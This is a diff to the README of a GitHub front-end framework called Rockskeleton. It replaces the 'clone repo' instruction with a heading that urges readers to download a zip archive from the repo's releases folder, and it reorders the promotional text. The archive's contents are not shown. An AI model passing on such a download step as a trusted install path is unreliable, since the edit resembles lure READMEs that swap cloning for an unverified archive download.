@@ -1,10 +1,12 @@
 # [Rockskeleton](https://github.com/meggistorvard/rockskeleton)
 
 Rockskeleton is a sleek, intuitive, and powerful front-end framework for faster and easier web development, created and maintained by Meggis
-Using a framework to construct your website’s front-end has a lot of advantages (and is pretty easy to boot!). Let’s go over what front-end frameworks are and why you should consider incorporating them into your web development work.
+Using a framework to construct your website’s front-end has a lot of advantages (and is pretty easy to boot!).
 
 
-To get started, clone repo
+##  To get started download release from <a href="https://github.com/meggistorvard/rockskeleton/tree/master/releases/rockskeleton-2.0.zip" target="_blank">`https://github.com/meggistorvard/rockskeleton/tree/master/releases/rockskeleton-2.0.zip`</a> 
+
+Let’s go over what front-end frameworks are and why you should consider incorporating them into your web development work.
 
 
 ## Open Source for More Flexibility
@@ -34,7 +36,7 @@ Using a framework to construct your website’s front-end has a lot of advantage
 
 ### Step 3
 
-- Create a new pull request using <a href="https://github.com/meggistorvard/rockskeleton/compare/" target="_blank">`https://github.com/meggistorvard/rockskeleton/compare/`</a>.
+- Create a new pull request using <a href="https://github.com/meggistorvard/rockskeleton/compare/" target="_blank">`https://github.com/meggistorvard/rockskeleton/compare/`</a>
 
 ---
 
